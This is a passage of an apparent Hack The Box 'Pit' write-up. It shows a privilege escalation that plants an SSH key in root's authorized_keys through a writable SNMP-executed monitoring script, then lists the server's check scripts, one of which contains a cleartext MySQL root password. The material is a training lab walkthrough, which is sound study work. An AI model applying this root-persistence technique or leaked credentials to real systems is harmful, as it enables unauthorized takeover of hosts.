</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#ff79c6>[</span>michelle@pit .ssh<span style=color:#ff79c6>]</span>$ ls -l /usr/local/ | grep monitoring
</span></span><span style=display:flex><span>drwxrwx---+ <span style=color:#bd93f9>2</span> root root <span style=color:#bd93f9>122</span> Oct  <span style=color:#bd93f9>3</span> 08:50 monitoring
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>michelle@pit .ssh<span style=color:#ff79c6>]</span>$ getfacl /usr/local/monitoring
</span></span><span style=display:flex><span>getfacl: Removing leading <span style=color:#f1fa8c>&#39;/&#39;</span> from absolute path names
</span></span><span style=display:flex><span><span style=color:#6272a4># file: usr/local/monitoring</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># owner: root</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># group: root</span>
</span></span><span style=display:flex><span>user::rwx
</span></span><span style=display:flex><span>user:michelle:-wx
</span></span><span style=display:flex><span>group::rwx
</span></span><span style=display:flex><span>mask::rwx
</span></span><span style=display:flex><span>other::---
</span></span></code></pre></td></tr></table></div></div><p>We just have to create a check_make_me_root.sh to become root. For example upload a public key into /root/.ssh/authorized_keys</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#39;echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAmmBiYlHIWk1kQ67MCFZa97diYFg6X9gXnep/BAkdD/ root@any.htb&#34; \
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>&gt; /root/.ssh/authorized_keys&#39;</span> &gt; /usr/local/monitoring/check_make_me_root.sh
</span></span></code></pre></td></tr></table></div></div><p>Moment of truth, we execute <code>snmpwalk -Os -v1 -c public 10.10.10.241 nsExtendObjects</code> then we try to ssh login as root, and it works like a charm:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#ff79c6>[</span>I<span style=color:#ff79c6>]</span> âžœ ssh -i ~/.ssh/id_ed25519_htb root@pit.htb
</span></span><span style=display:flex><span>Web console: https://pit.htb:9090/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Last login: Mon Jul <span style=color:#bd93f9>26</span> 06:58:15 <span style=color:#bd93f9>2021</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>root@pit ~<span style=color:#ff79c6>]</span><span style=color:#6272a4># cat root.txt</span>
</span></span><span style=display:flex><span>7fb116865e6477410fca1d8cc4426733
</span></span></code></pre></td></tr></table></div></div><h2 id=further-exploration>Further exploration</h2><pre><code>[root@pit ~]# cd /usr/local/monitoring/
[root@pit monitoring]# ls -la
total 20
drwxrwx---+  2 root root 122 Oct  3 09:10 .
drwxr-xr-x. 13 root root 149 Nov  3  2020 ..
-rwx------.  1 root root  50 Oct  3 09:10 check_free.sh
-rwx------.  1 root root 246 Oct  3 09:10 check_mariadb.sh
-rwx------.  1 root root  73 Oct  3 09:10 check_release.sh
-rwx------.  1 root root 217 Oct  3 09:10 check_selinux.sh
-rwx------.  1 root root  50 Oct  3 09:10 check_uptime.sh

[root@pit monitoring]# for i in * ; do echo $i ; cat $i ; done
</code></pre><p>check_free.sh</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff79c6>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;Memory usage&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/free -h
</span></span></code></pre></td></tr></table></div></div><p>check_mariadb.sh</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff79c6>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;Database status&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/mysql -u root -p<span style=color:#f1fa8c>&#39;ek)aizee^FaiModa~ce]z6c&#39;</span> -e <span style=color:#f1fa8c>&#39;use seeddms&#39;</span> &amp;&gt;/dev/null
</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>[</span> <span style=color:#8be9fd;font-style:italic>$?</span> -eq <span style=color:#bd93f9>0</span> <span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>then</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;OK - Connection to database successful.&#34;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>else</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;ERROR - Unable to connect to database.&#34;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>fi</span>
</span></span></code></pre></td></tr></table></div></div><p>check_release.sh</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff79c6>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;System release info&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/cat /etc/redhat-release
</span></span></code></pre></td></tr></table></div></div><p>check_selinux.sh</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff79c6>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;SELinux Settings&#34;</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;user&#34;</span>
</span></span><span style=display:flex><span>/usr/sbin/semanage user -l
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;login&#34;</span>
</span></span><span style=display:flex><span>/usr/sbin/semanage login -l
</span></span><span style=display:flex><span><span style=color:#6272a4>#echo &#34;permissive&#34;</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#/usr/sbin/semanage permissive -l</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#echo &#34;boolean&#34;</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#/usr/sbin/semanage boolean -l</span>
</span></span></code></pre></td></tr></table></div></div><p>check_uptime.sh</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff79c6>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;System uptime&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/uptime
</span></span></code></pre></td></tr></table></div></div><p>We can retrieve the exact same snmpwalk output:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff79c6>[</span>root@pit monitoring<span style=color:#ff79c6>]</span><span style=color:#6272a4># for i in * ; do bash $i ; done</span>
</span></span><span style=display:flex><span>Memory usage
</span></span><span style=display:flex><span>              total        used        free      shared  buff/cache   available
</span></span><span style=display:flex><span>Mem:          3.8Gi       491Mi       3.0Gi        40Mi       402Mi       3.1Gi
</span></span><span style=display:flex><span>Swap:         1.9Gi          0B       1.9Gi
</span></span><span style=display:flex><span>Database status
</span></span><span style=display:flex><span>OK - Connection to database successful.
</span></span><span style=display:flex><span>System release info
</span></span><span style=display:flex><span>CentOS Linux release 8.3.2011
</span></span><span style=display:flex><span>SELinux Settings
</span></span><span style=display:flex><span>user
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                Labeling   MLS/       MLS/
</span></span><span style=display:flex><span>SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>guest_u         user       s0         s0                             guest_r
</span></span><span style=display:flex><span>root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
</span></span><span style=display:flex><span>staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
</span></span><span style=display:flex><span>sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
</span></span><span style=display:flex><span>system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span style=display:flex><span>unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span style=display:flex><span>user_u          user       s0         s0                             user_r
</span></span><span style=display:flex><span>xguest_u        user       s0         s0                             xguest_r
</span></span><span style=display:flex><span>login
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Login Name           SELinux User         MLS/MCS Range        Service
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>__default__          unconfined_u         s0-s0:c0.c1023       *
</span></span><span style=display:flex><span>michelle             user_u               s0                   *
</span></span><span style=display:flex><span>root                 unconfined_u         s0-s0:c0.c1023       *
</span></span><span style=display:flex><span>System uptime
</span></span><span style=display:flex><span> 09:17:34 up <span style=color:#bd93f9>2</span> days,  8:05,  <span style=color:#bd93f9>1</span> user,  load average: 0.08, 0.04, 0.01
</span></span></code></pre></td></tr></table></div></div><p>/etc/snmpd.conf</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cfg data-lang=cfg><span style=display:flex><span><span style=color:#6272a4>####</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># First, map the community name &#34;public&#34; into a &#34;security name&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#       sec.name  source          community</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>com2sec notConfigUser  default       public</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>####</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># Second, map the security name into a group name:</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#       groupName      securityModel securityName</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>group   notConfigGroup v1           notConfigUser</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>group   notConfigGroup v2c           notConfigUser</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>####</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># Third, create a view for us to let the group have rights to:</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># Make at least  snmpwalk -v 1 localhost -c public system fast again.</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#       name           incl/excl     subtree         mask(optional)</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>view    systemview    included   .1.3.6.1.2.1.1</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>view    systemview    included   .1.3.6.1.2.1.25.1.1</span>
